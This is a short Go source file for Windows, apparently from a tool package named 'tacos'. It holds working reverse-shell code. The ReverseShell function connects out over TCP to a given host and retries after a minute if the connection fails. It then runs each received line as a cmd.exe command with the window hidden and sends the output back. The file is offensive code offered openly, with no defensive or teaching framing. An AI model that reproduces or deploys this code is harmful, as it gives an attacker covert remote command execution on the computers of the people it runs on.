//go:build windows
// +build windows

package tacos

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"syscall"
	"time"
)

//DetectDefaultShell: return the default shell
func DetectDefaultShell() string {
	shell := "cmd.exe"
	fmt.Println("here")
	return shell
}

//ReverseShell: spawn a reverse shell with pty targeting host (ip:port)
func ReverseShell(host string, shell string) {
	c, err := net.Dial("tcp", host)
	if nil != err {
		fmt.Println(err)
		if nil != c {
			c.Close()
		}
		time.Sleep(time.Minute)
		ReverseShell(host, shell)
	}

	r := bufio.NewReader(c)
	for {
		order, err := r.ReadString('\n')
		if nil != err {
			fmt.Println(err)
			c.Close()
			ReverseShell(host, shell)
			return
		}
		fmt.Println(order)
		cmd := exec.Command(shell, "/C", order)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ := cmd.CombinedOutput()
		c.Write(out)
	}
}
